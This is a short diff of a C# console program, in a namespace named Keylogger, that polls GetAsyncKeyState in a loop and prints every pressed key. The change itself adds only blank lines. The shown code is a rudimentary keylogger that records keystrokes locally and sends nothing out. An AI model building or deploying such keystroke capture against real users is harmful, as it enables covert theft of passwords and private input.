@@ -9,6 +9,7 @@ namespace Keylogger
     {
         [DllImport("user32.dll")]
         private static extern int GetAsyncKeyState(int i);
+        
         static void Main(string[] args)
         {
             while (true)
@@ -20,6 +21,7 @@ namespace Keylogger
                         Console.Write((Keys)i);
                     }
                 }
+                
                 Thread.Sleep(10);
             }
         }
